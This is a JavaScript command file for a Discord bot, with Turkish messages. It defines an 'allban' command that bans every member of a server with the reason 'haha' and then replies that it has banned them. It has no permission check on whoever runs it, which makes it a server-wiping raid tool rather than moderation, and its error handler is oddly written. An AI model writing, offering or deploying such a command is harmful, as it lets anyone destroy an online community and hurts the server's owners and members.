
const {EmbedBuilder} = require("discord.js");
const Discord = require("discord.js")
const config = require("../config.js")
exports.run = async (client, message, args) => {
    message.guild.members.cache.forEach(member => {
        member.ban({ reason: "haha" }).catch(err => console.log(`üyeyi banlama yetkim yok`) ? console.log("üyeyi banlama yetkim yok") :  null)
      });
    message.reply("banladım")



};
exports.conf = {
  aliases: []
};

exports.help = {
  name: "allban"
};
